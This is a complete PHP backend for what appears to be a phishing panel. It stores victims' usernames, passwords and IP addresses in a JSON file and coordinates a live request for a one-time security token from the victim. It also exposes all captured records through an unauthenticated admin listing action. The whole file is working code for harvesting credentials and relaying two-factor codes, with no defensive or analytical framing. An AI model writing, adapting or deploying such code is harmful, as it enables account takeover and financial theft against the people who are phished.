<?php
header('Content-Type: application/json');
$db_file = __DIR__ . '/admin/db.json';

function getDB() {
    global $db_file;
    if (!file_exists($db_file)) return ['acessos' => []];
    return json_decode(file_get_contents($db_file), true);
}

function saveDB($db) {
    global $db_file;
    file_put_contents($db_file, json_encode($db, JSON_PRETTY_PRINT));
}

$action = $_REQUEST['action'] ?? '';
$session_id = $_REQUEST['session_id'] ?? '';

if ($action == 'salvar_login') {
    $db = getDB();
    $id = bin2hex(random_bytes(8));
    $novo_acesso = [
        'id' => $id,
        'usuario' => $_POST['usuario'] ?? '',
        'senha' => $_POST['senha'] ?? '',
        'ip' => $_SERVER['REMOTE_ADDR'],
        'timestamp' => date('H:i:s'),
        'status' => 'online',
        'token_solicitado' => false,
        'token_recebido' => ''
    ];
    $db['acessos'][] = $novo_acesso;
    saveDB($db);
    echo json_encode(['status' => 'sucesso', 'session_id' => $id]);
} 
elseif ($action == 'solicitar_token') {
    $db = getDB();
    foreach ($db['acessos'] as &$a) {
        if ($a['id'] == $session_id) {
            $a['token_solicitado'] = true;
            break;
        }
    }
    saveDB($db);
    echo json_encode(['status' => 'sucesso']);
} 
elseif ($action == 'verificar_status_cliente') {
    $db = getDB();
    foreach ($db['acessos'] as $a) {
        if ($a['id'] == $session_id) {
            echo json_encode(['token_solicitado' => $a['token_solicitado']]);
            exit;
        }
    }
    echo json_encode(['token_solicitado' => false]);
} 
elseif ($action == 'enviar_token_cliente') {
    $db = getDB();
    foreach ($db['acessos'] as &$a) {
        if ($a['id'] == $session_id) {
            $a['token_recebido'] = $_POST['token'] ?? '';
            $a['token_solicitado'] = false;
            break;
        }
    }
    saveDB($db);
    echo json_encode(['status' => 'sucesso']);
} 
elseif ($action == 'listar_admin') {
    echo json_encode(getDB());
}
?>
